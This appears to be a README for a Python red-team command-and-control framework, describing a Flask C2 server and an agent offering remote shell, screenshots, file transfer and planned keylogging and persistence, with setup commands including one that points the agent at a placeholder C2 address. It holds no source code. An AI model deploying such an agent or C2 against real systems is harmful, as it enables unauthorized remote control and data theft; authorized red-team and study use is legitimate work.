# RedTeam Adversary Simulation Framework

A modular, Python-based Red Team adversary simulation framework for offensive security and red teaming exercises.

**DISCLAIMER**: This framework is for educational and authorized penetration testing purposes only. Use only on systems you own or have explicit permission to test. Unauthorized use is illegal and unethical.

##  Features

- **Modular Command & Control (C2) server** - Flask-based web interface
- **Cross-platform Python agent** - Works on Windows, Linux, and macOS
- **Secure communication** - HTTP/HTTPS support with encryption capabilities
- **Modular attack techniques** - Shell execution, screenshot capture, file transfer
- **MITRE ATT&CK mapping** - Techniques mapped to MITRE framework
- **Easy to extend** - Simple module system for adding new capabilities
- **Interactive C2 controller** - Command-line interface for operator interaction

## Quick Start

1. **Clone the repository:**
   ```bash
   git clone https://github.com/yourusername/redteam-framework.git
   cd redteam-framework
   ```

2. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

3. **Start the C2 server:**
   ```bash
   python c2/server.py
   ```

4. **Run the agent on a test machine:**
   ```bash
   python agent/agent.py --server https://<C2_SERVER_IP>:5000
   ```

5. **Add your own modules in `c2/modules/` and integrate with the C2!**

## Example Modules

- Remote shell execution
- Screenshot capture
- File upload/download
- Keylogging (to be added)
- Persistence (to be added)

## Legal Notice

For educational, ethical, and authorized Red Team use only. Do **not** deploy on systems you do not own or have explicit permission to test!

## MITRE ATT&CK Mapping
